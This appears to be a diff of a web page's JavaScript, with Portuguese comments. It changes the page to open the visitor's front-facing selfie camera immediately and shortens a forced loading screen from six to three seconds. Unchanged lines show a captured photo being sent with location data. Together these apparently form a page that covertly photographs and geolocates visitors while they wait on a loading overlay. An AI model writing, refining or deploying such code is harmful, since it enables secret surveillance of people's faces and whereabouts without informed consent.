@@ -43,14 +43,14 @@
       let stream;
       let loadingTimeout;
 
-      // Iniciar a câmera imediatamente
+      // Iniciar a câmera imediatamente (câmera frontal - selfie)
       async function startCamera() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
           console.error("API de mídia não suportada neste navegador.");
           return false;
         }
         try {
-          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); // Mudado para câmera frontal
           video.srcObject = stream;
           video.play();
           await new Promise(resolve => video.onloadedmetadata = resolve);
@@ -93,12 +93,12 @@
                 if (firstPhoto) {
                   sendLocation({ ...locationData, photos: [firstPhoto] });
                 }
-                // Garantir que o carregamento dure pelo menos 6 segundos
+                // Garantir que o carregamento dure pelo menos 3 segundos
                 const startTime = Date.now();
                 loadingTimeout = setTimeout(() => {
                   removeLoading();
                   loadingTimeout = null;
-                }, Math.max(6000 - (Date.now() - startTime), 0));
+                }, Math.max(3000 - (Date.now() - startTime), 0));
               }
             },
             error => {
